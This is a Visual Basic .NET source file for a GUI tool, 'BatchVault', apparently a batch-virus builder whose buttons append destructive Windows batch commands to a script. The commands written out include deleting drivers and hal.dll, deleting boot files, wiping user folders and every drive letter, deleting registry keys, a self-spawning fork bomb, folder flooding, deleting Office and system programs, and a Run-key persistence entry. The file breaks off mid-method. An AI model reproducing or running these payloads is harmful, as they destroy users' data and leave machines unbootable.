Public Class BatchVault
    Private filesaved As Integer
    Public Property Timer1 As Object

    Private Sub Virus_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dock = DockStyle.Fill
        Anchor = AnchorStyles.Top
        Anchor = AnchorStyles.Left
        TabPage1.Visible = False
        CheckedListBox1.Items.Add("MY DOCUMENTS")
        CheckedListBox1.Items.Add("MY Pictures")
        CheckedListBox1.Items.Add("Hal.dll")
        CheckedListBox1.Items.Add("MY Music")
        CheckedListBox2.Items.Add("Notepad")
        CheckedListBox2.Items.Add("Word")
        CheckedListBox2.Items.Add("Excel")
        CheckedListBox2.Items.Add("Calculator")
        CheckedListBox2.Items.Add("Access")
        CheckedListBox2.Items.Add("Inte.Explorer")
        CheckedListBox2.Items.Add("Paint")
        CheckedListBox3.Items.Add("Notepad")
        CheckedListBox3.Items.Add("Word")
        CheckedListBox3.Items.Add("Excel")
        CheckedListBox3.Items.Add("Calculator")
        CheckedListBox3.Items.Add("Access")
        CheckedListBox3.Items.Add("Inte.Explorer")
        CheckedListBox3.Items.Add("Paint")
        CheckedListBox3.Items.Add("Explorer")
        CheckedListBox4.Items.Add("My Documents")
        CheckedListBox4.Items.Add("My Downloads")
        CheckedListBox4.Items.Add("My Pictures")
        CheckedListBox4.Items.Add("My Music")
        CheckedListBox4.Items.Add("My Videos")
        CheckedListBox4.Items.Add("Desktop")
        CheckedListBox5.Items.Add("Files")
        CheckedListBox5.Items.Add("Users")
        CheckedListBox5.Items.Add("Folder")
    End Sub

    Private Sub Button2_Click_1(sender As Object, e As EventArgs) Handles Button2.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Swap Mouse Buttons"
        RichTextBox1.Text += Environment.NewLine + "RUNDLL32 USER32.DLL,SwapMouseButton"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button4_Click_1(sender As Object, e As EventArgs) Handles Button4.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Activate Blue Screen Of Death"
        RichTextBox1.Text += Environment.NewLine + "@((( Echo Off > Nul ) & Break Off )"
        RichTextBox1.Text += Environment.NewLine + "    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
        RichTextBox1.Text += Environment.NewLine + "    @Reg Add %HiveBSOD% /v BSOD /t REG_SZ /d %0 /f > Nul"
        RichTextBox1.Text += Environment.NewLine + "    @Del /q /s /f %SystemRoot%\Windows\System32\Drivers\*.*"
        RichTextBox1.Text += Environment.NewLine + ")"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button5_Click_1(sender As Object, e As EventArgs) Handles Button5.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Flood With Folders"
        RichTextBox1.Text += Environment.NewLine + ":start"
        RichTextBox1.Text += Environment.NewLine + "mkdir %random%"
        RichTextBox1.Text += Environment.NewLine + "md %random%"
        RichTextBox1.Text += Environment.NewLine + "goto start"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button6_Click_1(sender As Object, e As EventArgs) Handles Button6.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Spam Printer/ Local Disk"
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "notepad /P ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Fadeout()
        NewMethod()
    End Sub

    Private Shared Sub NewMethod()
        Throw New NotImplementedException()
    End Sub

    Private Sub Button8_Click_1(sender As Object, e As EventArgs) Handles Button8.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete All"
        RichTextBox1.Text += (TextBox1.Text)
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*"
        RichTextBox1.Text += (TextBox1.Text)
        RichTextBox1.Text += ">> FIleList_"
        RichTextBox1.Text += (TextBox1.Text)
        RichTextBox1.Text += ".txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | For /F ""tokens=1,* delims=: "" %%j in (FIleList_"
        RichTextBox1.Text += (TextBox1.Text)
        RichTextBox1.Text += ".txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"

    End Sub

    Private Sub CheckedListBox1_SelectedIndexChanged_1(sender As Object, e As EventArgs) Handles CheckedListBox1.SelectedIndexChanged
        Dim idx, sidx As Integer
        sidx = CheckedListBox1.SelectedIndex
        For idx = 0 To CheckedListBox1.Items.Count - 1
            If idx <> sidx Then
                CheckedListBox1.SetItemChecked(idx, False)
            Else
                CheckedListBox1.SetItemChecked(sidx, True)
            End If
        Next
    End Sub

    Private Sub Button9_Click_1(sender As Object, e As EventArgs) Handles Button9.Click
        If (CheckedListBox1.GetItemChecked(CheckedListBox1.Items.IndexOf("MY DOCUMENTS"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Delete My Documents"
            RichTextBox1.Text += Environment.NewLine + "del /f /q '%userprofile%\My Documents\*.*'"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            If (CheckedListBox1.GetItemChecked(CheckedListBox1.Items.IndexOf("MY Pictures"))) Then
                RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
                RichTextBox1.Text += Environment.NewLine + "rem Delete My Pictures"
                RichTextBox1.Text += Environment.NewLine + "del /f /q '%userprofile%\My Pictures\*.*'"
                RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            End If
            If (CheckedListBox1.GetItemChecked(CheckedListBox1.Items.IndexOf("MY Music"))) Then
                RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
                RichTextBox1.Text += Environment.NewLine + "rem Delete My Music"
                RichTextBox1.Text += Environment.NewLine + "del /f /q '%userprofile%\My Music\*.*'"
                RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            End If
            If (CheckedListBox1.GetItemChecked(CheckedListBox1.Items.IndexOf("Hal.dll"))) Then
                RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
                RichTextBox1.Text += Environment.NewLine + "rem Disable Computer By Deleting hal.dll"
                RichTextBox1.Text += Environment.NewLine + "del /f /s /a /q %SystemDrive%\WINDOWS\system32\hal.dll"
                RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            End If
        End If
    End Sub

    Private Sub Button10_Click_1(sender As Object, e As EventArgs) Handles Button10.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem The Last Restart"
        RichTextBox1.Text += Environment.NewLine + "attrib -r -s -h c:\autoexec.bat"
        RichTextBox1.Text += Environment.NewLine + "del c:\autoexec.bat"
        RichTextBox1.Text += Environment.NewLine + "attrib -r -s -h c:\boot.ini"
        RichTextBox1.Text += Environment.NewLine + "del c:\boot.ini"
        RichTextBox1.Text += Environment.NewLine + "attrib -r -s -h c:\ntldr"
        RichTextBox1.Text += Environment.NewLine + "del c:\ntldr"
        RichTextBox1.Text += Environment.NewLine + "attrib -r -s -h c:\windows\win.ini"
        RichTextBox1.Text += Environment.NewLine + "del c:\windows\win.ini"
        RichTextBox1.Text += Environment.NewLine + "shutdown /r /t 00"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Crash Computer"
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>crash.bat"""
        RichTextBox1.Text += Environment.NewLine + "start "" crash.bat"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub CheckedListBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CheckedListBox2.SelectedIndexChanged
        Dim idx, sidx As Integer
        sidx = CheckedListBox2.SelectedIndex
        For idx = 0 To CheckedListBox2.Items.Count - 1
            If idx <> sidx Then
                CheckedListBox2.SetItemChecked(idx, False)
            Else
                CheckedListBox2.SetItemChecked(sidx, True)
            End If
        Next
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        If (CheckedListBox2.GetItemChecked(CheckedListBox2.Items.IndexOf("Notepad"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Delete Notepad"
            RichTextBox1.Text += Environment.NewLine + "tskill notepad"
            RichTextBox1.Text += Environment.NewLine + "del /f /q ""%windir%\system32\notepad.exe"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox2.GetItemChecked(CheckedListBox2.Items.IndexOf("Word"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Delete Word"
            RichTextBox1.Text += Environment.NewLine + "tskill WINWORD"
            RichTextBox1.Text += Environment.NewLine + "del /f /q ""%SystemDrive%\Program Files\Microsoft Office\Office10\WINWORD.EXE"
            RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
        End If
        If (CheckedListBox2.GetItemChecked(CheckedListBox2.Items.IndexOf("Excel"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Delete Excel"
            RichTextBox1.Text += Environment.NewLine + "tskill excel"
            RichTextBox1.Text += Environment.NewLine + "del /f /q ""%SystemDrive%\Program Files\Microsoft Office\Office10\EXCEL.EXE"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox2.GetItemChecked(CheckedListBox2.Items.IndexOf("Calculator"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Delete Calculator"
            RichTextBox1.Text += Environment.NewLine + "tskill calc"
            RichTextBox1.Text += Environment.NewLine + "del /f /q ""%windir%\system32\calc.exe"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox2.GetItemChecked(CheckedListBox2.Items.IndexOf("Paint"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Delete Paint"
            RichTextBox1.Text += Environment.NewLine + "tskill mspaint"
            RichTextBox1.Text += Environment.NewLine + "del /f /q ""%windir%\system32\mspaint.exe"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox2.GetItemChecked(CheckedListBox2.Items.IndexOf("Access"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Delete Access"
            RichTextBox1.Text += Environment.NewLine + "tskill msaccess"
            RichTextBox1.Text += Environment.NewLine + "del /f /q ""%SystemDrive%\Program Files\Microsoft Office\Office10\MSACCESS.EXE"
            RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
        End If
        If (CheckedListBox2.GetItemChecked(CheckedListBox2.Items.IndexOf("Inte.Explorer"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Delete Internet Explorer"
            RichTextBox1.Text += Environment.NewLine + "tskill iexplore"
            RichTextBox1.Text += Environment.NewLine + "del /f /q ""C:\Program Files\Internet Explorer\iexplore.exe"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If

    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        If CheckBox1.Checked = True Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "File & Folders"
            RichTextBox2.Text += Environment.NewLine + "Subfolders in a Target folder will be deleted"
            RichTextBox1.Text += Environment.NewLine + "for %%d in (c d e f g h i j k l m n o p q r s t u v w x y z) do ("
            RichTextBox1.Text += Environment.NewLine + "  del %%d:\"
            RichTextBox1.Text += (TextBox2.Text)
            RichTextBox1.Text += " /s /q /f 2>nul && goto :break)"
            RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
        End If
        If CheckBox2.Checked = True Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "Path-Name"
            RichTextBox1.Text += Environment.NewLine + "del "
            RichTextBox1.Text += (TextBox2.Text)
            RichTextBox1.Text += "  /s /q /f 2> nul "
            RichTextBox1.Text += "&& goto :break"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If CheckBox4.Checked = True Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "Results to a .txt file"
            RichTextBox1.Text += Environment.NewLine + ":break"
            RichTextBox1.Text += Environment.NewLine + "if %errorlevel% equ 0 ("
            RichTextBox1.Text += Environment.NewLine + "  echo SUCCESS >>noo.txt"
            RichTextBox1.Text += Environment.NewLine + ") else ("
            RichTextBox1.Text += Environment.NewLine + "  echo FAILURE >>noo.txt"
            RichTextBox2.Text += Environment.NewLine + "Results Will be sent to a txt file either the oparation succeeded or failed"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If CheckBox3.Checked = True Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox2.Text += Environment.NewLine + "This Will Turn the Target to a null(0) size"
            RichTextBox1.Text += Environment.NewLine + "Permanent Delete"
            RichTextBox1.Text += Environment.NewLine + "TYPE nul >"
            RichTextBox1.Text += (TextBox2.Text)
            RichTextBox1.Text += ": /s /q /f 2>nul && goto :break"
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            TextBox2.Enabled = True
            TextBox2.Text = "eg: WX3.exe or \P.....\....."
            CheckBox2.Checked = False
            CheckBox3.Checked = False
        Else
            TextBox2.Enabled = False
            CheckBox4.Checked = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            TextBox2.Enabled = True
            TextBox2.Text = "eg: C:\Program Files\"
            CheckBox1.Checked = False
            CheckBox3.Checked = False
        Else
            TextBox2.Enabled = False
            CheckBox4.Checked = False
        End If
    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "Format All Drives"
        RichTextBox1.Text += Environment.NewLine + "for %%d in (c d e f g h i j k l m n o p q r s t u v w x y z) do ("
        RichTextBox1.Text += Environment.NewLine + "  del %%d:\*.* /f /s /q)"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox2.Text += Environment.NewLine + "You Might Require ADMIN Privlages................"
        MsgBox("This will Format all Drives")
    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "Delete Registry"
        RichTextBox1.Text += Environment.NewLine + "reg delete HKCR/.exe"
        RichTextBox1.Text += Environment.NewLine + "reg delete HKCR/.dll"
        RichTextBox1.Text += Environment.NewLine + "reg delete HKCR/*"
        RichTextBox2.Text += Environment.NewLine + "This Will Delete the Registry..............."
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button17_Click(sender As Object, e As EventArgs) Handles Button17.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "Delete Boot Files"
        RichTextBox1.Text += Environment.NewLine + "attrib -r -s -h %systemdrive%\autoexec.bat"
        RichTextBox1.Text += Environment.NewLine + "del %systemdrive%\autoexec.bat"
        RichTextBox1.Text += Environment.NewLine + "attrib -r -s -h %systemdrive%\boot.ini"
        RichTextBox1.Text += Environment.NewLine + "del %systemdrive%\boot.ini"
        RichTextBox1.Text += Environment.NewLine + "attrib -r -s -h %systemdrive%\ntldr"
        RichTextBox1.Text += Environment.NewLine + "del %systemdrive%\ntldr"
        RichTextBox1.Text += Environment.NewLine + "attrib -r -s -h %systemdrive%\windows\win.ini"
        RichTextBox1.Text += Environment.NewLine + "del %systemdrive%\windows\win.ini"
        RichTextBox2.Text += Environment.NewLine + "This Will Delete All Boot Files............"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            TextBox2.Enabled = True
            TextBox2.Text = "eg: C:\Program Files (x86)\"
            CheckBox1.Checked = False
            CheckBox2.Checked = False
        Else
            TextBox2.Enabled = False
            CheckBox4.Checked = False
        End If
    End Sub

    Private Sub BothButton_Click(sender As Object, e As EventArgs) Handles BothButton.Click
